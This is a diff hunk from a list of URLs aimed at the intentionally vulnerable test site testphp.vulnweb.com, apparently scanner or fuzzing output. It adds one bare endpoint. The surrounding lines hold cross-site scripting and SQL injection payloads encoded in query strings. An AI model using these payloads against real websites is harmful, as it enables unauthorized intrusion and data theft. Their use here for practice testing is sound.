@@ -33,6 +33,7 @@ http://testphp.vulnweb.com/Mod_Rewrite_Shop/buy.php?id=-%27&gt=
 http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php?id=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E&mjqN=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E
 http://testphp.vulnweb.com/Mod_Rewrite_Shop/rate.php?id=-
 http://testphp.vulnweb.com/Mod_Rewrite_Shop/rate.php?id=-1+OR+17-7%3D10CONFIRMED%27&gt=
+http://testphp.vulnweb.com/bxss/vuln.php?id=
 http://testphp.vulnweb.com/comment.php?aid=%27%20UNION%20SELECT%20%2A%20FROM%20information_schema%20--
 http://testphp.vulnweb.com/comment.php?pid=3A01
 http://testphp.vulnweb.com/index.php?%25id%25=%28SELECT%20CONCAT%28CONCAT%28%27qqpxq%27%2C%28CASE%20WHEN%20%287911%3D7911%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2C%27qvxvq%27%29%29&user=2
